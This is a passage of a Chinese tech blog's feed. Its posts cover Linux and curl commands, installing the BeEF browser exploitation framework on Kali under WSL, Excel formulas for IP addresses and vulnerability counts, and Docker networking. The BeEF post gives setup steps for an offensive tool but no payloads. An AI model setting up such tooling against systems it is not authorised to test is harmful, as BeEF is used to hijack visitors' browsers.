href="https://www.helplib.com/GitHub/article_124955" target="_blank" rel="noopener">主题参考链接</a></p><p><code>omf install bobthefish</code></p></li><li><p>进行一些设置</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set -U theme_nerd_fonts yes</span><br><span class="line">set -U theme_color_scheme terminal-dark-white</span><br><span class="line"># Ubuntu 选择 set -U theme_color_scheme zenburn  </span><br><span class="line">set -U fish_prompt_pwd_dir_length 0</span><br></pre></td></tr></tbody></table></figure></li><li><p>如何使用fish <a href="http://www.ruanyifeng.com/blog/2017/05/fish_shell.html" target="_blank" rel="noopener">参考链接</a></p><p>重点掌握  五，自动建议； 六，自动补全</p></li></ol></li></ol><h1 id="01-curl"><a href="#01-curl" class="headerlink" title="01 curl"></a>01 curl</h1><p><code>curl</code>这个命令很常用，用来访问一个网站，上传和下载文件都可以</p><p>常用命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -o <span class="regexp">/dev/</span>null -s -w %{http_code} www.baidu.com <span class="comment"># 测试某个网站返回值</span></span><br><span class="line">curl -x <span class="number">192.168</span>.<span class="number">1.1</span>:<span class="number">1080</span> http:<span class="regexp">//</span>www.google.com <span class="comment"># 走代理</span></span><br></pre></td></tr></tbody></table></figure><p>详细参数</p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">A/--user-agent &lt;string&gt;              设置用户代理发送给服务器</span></span><br><span class="line"><span class="ruby">-b/--cookie &lt;name=string/file&gt;    cookie字符串或文件读取位置</span></span><br><span class="line"><span class="ruby">-c/--cookie-jar &lt;file&gt;                操作结束后把cookie写入到这个文件中</span></span><br><span class="line"><span class="ruby">-C/--continue-at &lt;offset&gt;            断点续转</span></span><br><span class="line"><span class="ruby">-D/--dump-header &lt;file&gt;              把header信息写入到该文件中</span></span><br><span class="line"><span class="ruby">-e/--referer                       来源网址</span></span><br><span class="line"><span class="ruby">-f/--fail                             连接失败时不显示http错误</span></span><br><span class="line"><span class="ruby">-o/--output                            把输出写到该文件中</span></span><br><span class="line"><span class="ruby">-O/--remote-name                      把输出写到该文件中，保留远程文件的文件名</span></span><br><span class="line"><span class="ruby">-r/--range &lt;range&gt;                     检索来自HTTP/<span class="number">1.1</span>或FTP服务器字节范围</span></span><br><span class="line"><span class="ruby">-s/--silent                            静音模式。不输出任何东西</span></span><br><span class="line"><span class="ruby">-T/--upload-file &lt;file&gt;                上传文件</span></span><br><span class="line"><span class="ruby">-u/--user &lt;user[<span class="symbol">:password</span>]&gt;      设置服务器的用户和密码</span></span><br><span class="line"><span class="ruby">-w/--write-out [format]                什么输出完成后</span></span><br><span class="line"><span class="ruby">-x/--proxy &lt;host[<span class="symbol">:port</span>]&gt;              在给定的端口上使用HTTP代理</span></span><br><span class="line"><span class="ruby">-<span class="comment">#/--progress-bar                      进度条显示当前的传送状态</span></span></span><br></pre></td></tr></tbody></table></figure><h1 id="02-查看Linux信息"><a href="#02-查看Linux信息" class="headerlink" title="02 查看Linux信息"></a>02 查看Linux信息</h1><p><code>cat /proc/version</code> 或者 <code>uname -a</code> 即可</p><h1 id="03-更新源"><a href="#03-更新源" class="headerlink" title="03 更新源"></a>03 更新源</h1><p>各个版本下的源位置</p><p>Ubuntu 18.4 &amp;&amp; Kali： <code>/etc/apt/sources.list</code><br>CentOS : <code>/etc/yum.repos.d/CentOS-Base.repo</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-把一些好用的Linux命令收集起来&quot;&gt;&lt;a href=&quot;#00-把一些好用的Linux命令收集起来&quot; class=&quot;headerlink&quot; title=&quot;00 把一些好用的Linux命令收集起来&quot;&gt;&lt;/a&gt;00 把一些好用的Linux命令收集起来&lt;/h1&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="command" scheme="https://zzdkl.com.cn/categories/Linux/command/"/>
    
    
      <category term="Linux" scheme="https://zzdkl.com.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Kali(Win10) + beEF</title>
    <link href="https://zzdkl.com.cn/2019/08/29/kali_wsl_install_beEF/"/>
    <id>https://zzdkl.com.cn/2019/08/29/kali_wsl_install_beEF/</id>
    <published>2019-08-29T01:26:59.635Z</published>
    <updated>2019-08-29T01:31:46.316Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>Windows里安装Kali子系统（Windows Linux子系统（WSL））</p><a id="more"></a><h1 id="01-安装wsl"><a href="#01-安装wsl" class="headerlink" title="01. 安装wsl"></a>01. 安装wsl</h1><p><a href="https://zhuanlan.zhihu.com/p/34308046" target="_blank" rel="noopener">参考链接</a></p><ol><li><p>第一需要在“控制面板–程序–启动或关闭Windows功能–适用于Linux的Windows子系统”打开选项，然后重启<img src="C:%5CUsers%5CElliot%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1554081584214.png" alt="1554081584214"></p><p><strong>或者</strong>用管理员权限运行powershell并运行下面的命令：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></tbody></table></figure></li><li><p>在Windows APP Store里安装Kali：<img src="C:%5CUsers%5CElliot%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1554080588775.png" alt="1554080588775"></p></li><li><p>安装成功<img src="C:%5CUsers%5CElliot%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1554080639720.png" alt="1554080639720"></p></li><li><p>打开如下<img src="C:%5CUsers%5CElliot%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1554080663480.png" alt="1554080663480"></p></li></ol><h1 id="02-Kali进行配置"><a href="#02-Kali进行配置" class="headerlink" title="02. Kali进行配置"></a>02. Kali进行配置</h1><ol><li>首先要设置用户名和密码，默认root账号已存在，不能再次设置<img src="C:%5CUsers%5CElliot%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1554081712159.png" alt="1554081712159"></li><li><strong>WSL默认的Linux均无任何安装包，需手动更新，不过已配好官方源</strong></li></ol><blockquote><ol><li><p>在CMD里直接输入 <code>wsl</code> 即可进入WSL子系统，如图，也可手动打开图标，均需管理员权限<img src="C:%5CUsers%5CElliot%5CPictures%5Cmd_temp%5C1554082799506.png" alt="1554082799506"></p></li><li><p>我们可以看见默认的目录是在<code>/mnt/c/Users/Elliot</code> 下的</p></li></ol></blockquote><ol start="3"><li>进行更新，以及安装beEF所必须的环境，依赖包。命令如下：</li></ol><blockquote><p>  apt-get update<br>  apt-get install ruby<br>  apt-get install libssl-dev libsqlite3-dev sqlite<br>  sudo apt-get install g++<br>  apt-get install git –fix-missing</p></blockquote><blockquote><p>  另一个坑点：<strong>没有root权限</strong></p><p>  解决办法：1.切换到root    2.更改密码    <a href="https://www.hida.in/reset-the-password-in-linux-bash-in-windows.html" target="_blank" rel="noopener">参考链接</a></p><p>  命令：    <code>su root</code>    <code>passwd  root</code></p></blockquote><ol start="4"><li><p>安装好环境这些变量之后，切换到一个目录进行安装，我这里是非root用户的根目录（坑点之一，下面有讲） <code>cd ~</code>    <code>git clone https://github.com/beefproject/beef</code></p></li><li><p>下载好后切换到目录 <code>cd beef</code> ,使用下列命令进行安装</p></li></ol><blockquote><p>  gem install bundler<br>  bundle install</p><p>  ./install</p></blockquote><blockquote><p>  坑点：bundle install 不让用root进行安装，切换回普通用户重新下载安装，以下是警告内容</p><p>  <img src="C:%5CUsers%5CElliot%5CPictures%5Cmd_temp%5C1554090538158.png" alt="1554090538158"></p><p>  更新：这个警告应该只是一个警告，可无视</p></blockquote><ol start="6"><li><p>安装好以后，修改默认账号密码</p><blockquote><p>  vim ./config.yaml</p></blockquote></li><li><p>使用 <code>./beef</code> 开始服务</p></li><li><p>访问 <code>http://127.0.0.1:3000/ui/panel</code> 即可</p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;Windows里安装Kali子系统（Windows Linux子系统（WSL））&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Windows/"/>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="WSL" scheme="https://zzdkl.com.cn/categories/Windows/WSL/"/>
    
      <category term="Kali" scheme="https://zzdkl.com.cn/categories/Linux/Kali/"/>
    
    
      <category term="WSL" scheme="https://zzdkl.com.cn/tags/WSL/"/>
    
      <category term="Kali" scheme="https://zzdkl.com.cn/tags/Kali/"/>
    
      <category term="beEF" scheme="https://zzdkl.com.cn/tags/beEF/"/>
    
  </entry>
  
  <entry>
    <title>excel中IP地址的处理</title>
    <link href="https://zzdkl.com.cn/2019/08/29/dispose_ip_in_excel/"/>
    <id>https://zzdkl.com.cn/2019/08/29/dispose_ip_in_excel/</id>
    <published>2019-08-29T01:09:13.381Z</published>
    <updated>2019-08-29T01:11:12.993Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00.前言"></a>00.前言</h1><p>在excel中处理IP地址是很经常的事情，那么对于IP地址的处理又不似数据那样的简单，有很多小数点</p><p>这个特性就造成了IP地址处理的棘手程度。</p><p>现在我们就对excel表格中IP地址的处理进行简答的总结，处理一下</p><a id="more"></a><h1 id="01-IP和漏洞数量计算"><a href="#01-IP和漏洞数量计算" class="headerlink" title="01. IP和漏洞数量计算"></a>01. IP和漏洞数量计算</h1><p>对于脚本处理后的xlsx文件，进行处理</p><p>在<code>插入</code>中选择<code>数据透视表</code></p><p>然后在右边手动添加如下的配置即可，注意需要去掉漏洞的<code>空白</code></p><p>截图如下</p><p><img src="/upload_image/2019/04/Snipaste_2019-04-28_16-02-57.png" alt="截图1"></p><p><strong>！！需要注意把紧急和高危的数据列进行置换</strong></p><p>方法是复制数据到另一列中，然后选中列，按住shift键进行右移</p><h1 id="02-IP地址填充0"><a href="#02-IP地址填充0" class="headerlink" title="02. IP地址填充0"></a>02. IP地址填充0</h1><p>例如： 172.10.3.4 ，把它填充成 172.010.003.004</p><p>处理方法：把这个IP地址放在A列，在B列放入这个函数即可</p><figure class="highlight excel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="built_in">TEXT</span>(<span class="built_in">LEFT</span>(<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)-<span class="number">1</span>),<span class="string">"000"</span>) &amp; <span class="string">"."</span> &amp; <span class="built_in">TEXT</span>(<span class="built_in">MID</span>(<span class="symbol">A1</span>,<span class="built_in">FIND</span>( <span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)+<span class="number">1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)+<span class="number">1</span>)-<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)-<span class="number">1</span>),<span class="string">"000"</span>) &amp; <span class="string">"."</span> &amp; <span class="built_in">TEXT</span>(<span class="built_in">MID</span>(<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)+<span class="number">1</span>)+<span class="number">1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>, <span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)+<span class="number">1</span>)+<span class="number">1</span>)-<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)+<span class="number">1</span>)-<span class="number">1</span>), <span class="string">"000"</span>) &amp; <span class="string">"."</span> &amp; <span class="built_in">TEXT</span>(<span class="built_in">RIGHT</span>(<span class="symbol">A1</span>,<span class="built_in">LEN</span>(<span class="symbol">A1</span>)-<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="built_in">FIND</span>(<span class="string">"."</span>,<span class="symbol">A1</span>,<span class="built_in">FIND</span>( <span class="string">"."</span>,<span class="symbol">A1</span>,<span class="number">1</span>)+<span class="number">1</span>)+<span class="number">1</span>)),<span class="string">"000"</span>)</span><br></pre></td></tr></tbody></table></figure><p>截图如下</p><p><img src="/upload_image/2019/04/Snipaste_2019-04-28_16-05-37.png" alt="截图2"></p><h1 id="03-IP地址去掉0"><a href="#03-IP地址去掉0" class="headerlink" title="03. IP地址去掉0"></a>03. IP地址去掉0</h1><p>对于上面办法得到的IP地址，进行排序即可</p><p>可是我们最后需要的却不是 172.010.003.004 这个格式，我们就对它进行处理</p><p><img src="http://www.exceltip.net/forum.php?mod=image&amp;aid=42119&amp;size=100x100&amp;key=af751e3bcd5c1aa3&amp;type=1" alt="网上存在的处理gif图（下载不下来）"></p><ol><li><p>首先选中数据</p></li><li><p>在<code>数据</code>中选<code>分列</code>,在第三步的<code>目标区域</code>选中粘贴的位置</p></li><li><p>然后对后面三列数据选择插入整列(为了方便加入小数点.)</p></li><li><p>然后再选中数据，进行<code>定位条件</code>（快捷键F5)，选中空值，输入小数点，然后Ctrl+Enter进行全部替换  <a href="https://zhidao.baidu.com/question/132939510" target="_blank" rel="noopener">参考链接</a>    </p> <figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F5键打开“定位”对话框，单击“定位条件”按钮，在“定位条件”对话框中选择“空值”，单击“确定”。Excel会选中区域中的所有空白单元格，在编辑栏中输入“<span class="number">0</span>”，然后按Ctrl+Enter键在所有空白单元格中输入零值。</span><br></pre></td></tr></tbody></table></figure></li><li><p>最后合并IP，使用函数<code>=CONCATENATE(K10,L10,M10,N10,O10,P10,Q10)</code>  <a href="https://jingyan.baidu.com/article/76a7e409b61726fc3b6e15ba.html" target="_blank" rel="noopener">参考链接</a></p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00.前言&quot;&gt;&lt;/a&gt;00.前言&lt;/h1&gt;&lt;p&gt;在excel中处理IP地址是很经常的事情，那么对于IP地址的处理又不似数据那样的简单，有很多小数点&lt;/p&gt;
&lt;p&gt;这个特性就造成了IP地址处理的棘手程度。&lt;/p&gt;
&lt;p&gt;现在我们就对excel表格中IP地址的处理进行简答的总结，处理一下&lt;/p&gt;
    
    </summary>
    
      <category term="Office" scheme="https://zzdkl.com.cn/categories/Office/"/>
    
      <category term="Network" scheme="https://zzdkl.com.cn/categories/Network/"/>
    
      <category term="excel" scheme="https://zzdkl.com.cn/categories/Office/excel/"/>
    
      <category term="IP" scheme="https://zzdkl.com.cn/categories/Network/IP/"/>
    
    
      <category term="excel" scheme="https://zzdkl.com.cn/tags/excel/"/>
    
      <category term="IP" scheme="https://zzdkl.com.cn/tags/IP/"/>
    
  </entry>
  
  <entry>
    <title>excel导入数据库</title>
    <link href="https://zzdkl.com.cn/2019/08/29/excel_import_to_db/"/>
    <id>https://zzdkl.com.cn/2019/08/29/excel_import_to_db/</id>
    <published>2019-08-29T01:06:29.191Z</published>
    <updated>2019-08-29T01:43:08.591Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今日任务：查找出excel表中的Plugin_ID,然后进行导入数据库</p><p>所用工具：sqlite stdio</p><a id="more"></a><h1 id="01-查找Plugin-ID"><a href="#01-查找Plugin-ID" class="headerlink" title="01 查找Plugin_ID"></a>01 查找Plugin_ID</h1><p>人工太慢了，学好python的重要性又多了一步。人生苦短，我学python</p><p>首先我参考excel表中的vlookup函数，<a href="https://zhuanlan.zhihu.com/p/29161495" target="_blank" rel="noopener">vlookup()参考资料</a></p><p>坑点来了：vlookup()不支持255个字符以上的查询。。<a href="https://support.office.com/zh-cn/article/%E5%A6%82%E4%BD%95%E6%9B%B4%E6%AD%A3-vlookup-%E5%87%BD%E6%95%B0%E7%9A%84-value-%E9%94%99%E8%AF%AF-1fabc766-32ae-4f7f-a2c4-d095153e6894" target="_blank" rel="noopener">office官方参考链接</a></p><p>找了找资料，换成了loopup()函数，还是不行，网上找了找资料，发现这样是可以的</p><p><code>=LOOKUP(1,0/(J1:J10=值),N1:N10)</code>  </p><p>前一个J列为匹配的列，这里为description，N列为匹配显示的列，这里为plugin_ID</p><p>经过处理后，需 <strong>另存为csv文件</strong></p><p>最终结果如下<img src="/upload_image/2019/05/%E6%88%AA%E5%9B%BE2019-05-08-150512.jpg" alt="最终结果"></p><h1 id="02-导入数据库"><a href="#02-导入数据库" class="headerlink" title="02 导入数据库"></a>02 导入数据库</h1><p>通过excel导入数据库</p><p>用sqlite工具即可，这里选择sqlite studio和navicat premium为例</p><p><img src="/upload_image/2019/05/Snipaste_2019-05-08_15-10-17.png" alt="sqlite studio"></p><p><img src="/upload_image/2019/05/Snipaste_2019-05-08_15-10-32.png" alt="navicat premium"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今日任务：查找出excel表中的Plugin_ID,然后进行导入数据库&lt;/p&gt;
&lt;p&gt;所用工具：sqlite stdio&lt;/p&gt;
    
    </summary>
    
      <category term="Office" scheme="https://zzdkl.com.cn/categories/Office/"/>
    
      <category term="Database" scheme="https://zzdkl.com.cn/categories/Database/"/>
    
      <category term="excel" scheme="https://zzdkl.com.cn/categories/Office/excel/"/>
    
      <category term="excel" scheme="https://zzdkl.com.cn/categories/Database/excel/"/>
    
    
      <category term="excel" scheme="https://zzdkl.com.cn/tags/excel/"/>
    
      <category term="database" scheme="https://zzdkl.com.cn/tags/database/"/>
    
  </entry>
  
  <entry>
    <title>Docker网络类</title>
    <link href="https://zzdkl.com.cn/2019/08/29/docker_network_configuration/"/>
    <id>https://zzdkl.com.cn/2019/08/29/docker_network_configuration/</id>
    <published>2019-08-29T00:58:35.860Z</published>
    <updated>2019-08-29T02:37:01.203Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>今天任务：</p><ol><li>提高安全性，使用容器网络连接不同容器</li><li>连接使用固定ip，以防容器重启后地址改变</li><li>研究容器网络链接如何实现</li></ol><a id="more"></a><h1 id="01-实现方式-Docker容器访问与互联-（端口映射）"><a href="#01-实现方式-Docker容器访问与互联-（端口映射）" class="headerlink" title="01 实现方式 : Docker容器访问与互联 （端口映射）"></a>01 实现方式 : Docker容器访问与互联 （端口映射）</h1><p><del>过时资料 <a href="https://jiajially.gitbooks.io/dockerguide/content/chapter_fastlearn/docker_run/link_manager.html" target="_blank" rel="noopener">推荐参考链接</a></del></p><p>–name –hostname参数</p><p>首先设置各个容器的名称，使用–name参数</p><p>-p 和 -P 的区别就是一个指定端口，一个随机端口</p><p>删除所有容器（不兼容fish）： <code>docker rm $(docker ps -a -q)</code></p><p>列出所有容器的IP地址： </p><figure class="highlight twig"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">docker inspect --format='</span><span class="template-variable">{{.Name}}</span><span class="xml"> - </span><span class="template-variable">{{<span class="name">range</span> .NetworkSettings.Networks}}</span><span class="xml"></span><span class="template-variable">{{.IPAddress}}</span><span class="xml"></span><span class="template-variable">{{end}}</span><span class="xml">' $(docker ps -aq)</span></span><br></pre></td></tr></tbody></table></figure><h1 id="02-容器间通信-（容器互联）"><a href="#02-容器间通信-（容器互联）" class="headerlink" title="02 容器间通信 （容器互联）"></a>02 容器间通信 （容器互联）</h1><p><strong>已不支持–link参数</strong></p><p><del>~ –link <name or="" id="">:alias ~</name></del></p><p><del>~ <a href="https://www.jianshu.com/p/21d66ca6115e" target="_blank" rel="noopener">参考连接</a> ~</del></p><hr><p>继续更新，两班倒的生活真是要人命</p><hr><h1 id="03-进阶结果-（hostname直接访问）"><a href="#03-进阶结果-（hostname直接访问）" class="headerlink" title="03 进阶结果 （hostname直接访问）"></a>03 进阶结果 （hostname直接访问）</h1><p>居然找的是过时的4年前的资料。。。</p><p>一口老血吐出来，经过大佬指点，直接使用hostname访问即可</p><p><code>--name</code>和<code>--hostname</code>有什么区别？</p><p>name只是容器名字，用来容器操作</p><p>hostname为容器主机名字，可以用来网络查找，类似于域名，但却缺少DNS过程，详细DNS过程以后再详细研究（应该涉及到跨主机容器通信）  </p><p>这里有个疑问点：使用hostname访问需不需要创建网络？</p><p>不行，指定IP的话就必须要创建一个网络</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-14_22-16-58.png" alt="必须指定网络"></p><p>不指定IP的话，–add-host参数又好像不太可用<br>所以还是创建一个网络最保险</p><h1 id="04-网络设置"><a href="#04-网络设置" class="headerlink" title="04 网络设置"></a>04 网络设置</h1><p>创建网络 <code>docker network create -d bridge my-bridge-network</code></p><p>删除网络 <code>docker network rm my-bridge-network</code></p><p>设置子网 <code>docker network create --subnet=172.18.0.0/16 mynetwork</code></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker network所有子命令如下：</span><br><span class="line"></span><br><span class="line">docker<span class="built_in"> network </span>create</span><br><span class="line">docker<span class="built_in"> network </span>connect</span><br><span class="line">docker<span class="built_in"> network </span>ls</span><br><span class="line">docker<span class="built_in"> network </span>rm</span><br><span class="line">docker<span class="built_in"> network </span>disconnect</span><br><span class="line">docker<span class="built_in"> network </span>inspect</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.centos.bz/2017/01/docker-network-create-create-a-network/" target="_blank" rel="noopener">创建网络参考链接1</a><br><a href="https://blog.csdn.net/gezhonglei2007/article/details/51627821" target="_blank" rel="noopener">创建网络参考链接2_推荐链接</a></p><h1 id="05-–expose参数"><a href="#05-–expose参数" class="headerlink" title="05 –expose参数"></a>05 –expose参数</h1><p><code>EXPOSE</code> 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射<br>只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务</p><p>用法 ： <code>--expose 3389</code></p><p><a href="https://yeasy.gitbooks.io/docker_practice/image/dockerfile/expose.html" target="_blank" rel="noopener">expose优秀参考链接</a></p><h1 id="06-最后结果"><a href="#06-最后结果" class="headerlink" title="06 最后结果"></a>06 最后结果</h1><p>最后结果为：</p><ol><li>创建一个网络，分配子网  <code>docker network create --subnet=172.18.0.0/16 mynetwork</code>  </li><li>创建容器时，使用<code>--ip</code>指定IP  </li><li>使用<code>expose</code>避免暴露端口到主机   </li><li>添加<code>name</code>和<code>hostname</code>  </li><li>使用<code>--add-host</code>把容器加进host表 <code>--add-host NAME:IP</code></li></ol><p>最后结果命令为：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker<span class="built_in"> network </span>create <span class="attribute">--subnet</span>=172.18.0.0/16 GitHub_NetWork     # 创建网络</span><br><span class="line">docker <span class="builtin-name">run</span> -itd --expose 27017 --name mongo_name --hostname mongo --network test_network --ip 172.18.0.2 --add-host hawkeye:172.18.0.3 -v <span class="variable">$PWD</span>/db:/data/db  mongo   # 创建容器</span><br><span class="line">docker <span class="builtin-name">run</span> -tid -p 8004:80 --name hawkeye_name --hostname hawkeye --network test_network --ip 172.18.0.3 --add-host mongo:172.18.0.2 -e <span class="attribute">MONGODB_URI</span>=mongodb://mongo:27017 daocloud.io/0xbug/hawkeye   # 创建容器2</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;今天任务：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提高安全性，使用容器网络连接不同容器&lt;/li&gt;
&lt;li&gt;连接使用固定ip，以防容器重启后地址改变&lt;/li&gt;
&lt;li&gt;研究容器网络链接如何实现&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://zzdkl.com.cn/categories/Linux/"/>
    
      <category term="Docker" scheme="https://zzdkl.com.cn/categories/Docker/"/>
    
      <category term="Network" scheme="https://zzdkl.com.cn/categories/Docker/Network/"/>
    
      <category term="Docker" scheme="https://zzdkl.com.cn/categories/Linux/Docker/"/>
    
    
      <category term="Docker" scheme="https://zzdkl.com.cn/tags/Docker/"/>
    
      <category term="Netwrok" scheme="https://zzdkl.com.cn/tags/Netwrok/"/>
    
  </entry>
  
  <entry>
    <title>在CentOS 7上安装Nessus</title>
    <link href="https://zzdkl.com.cn/2019/08/28/Nessus_in_CentOS_installation/"/>
    <id>https://zzdkl.com.cn/2019/08/28/Nessus_in_CentOS_installation/</id>
    <published>2019-08-28T07:44:00.699Z</published>
    <updated>2019-08-28T07:54:59.975Z</updated>
    
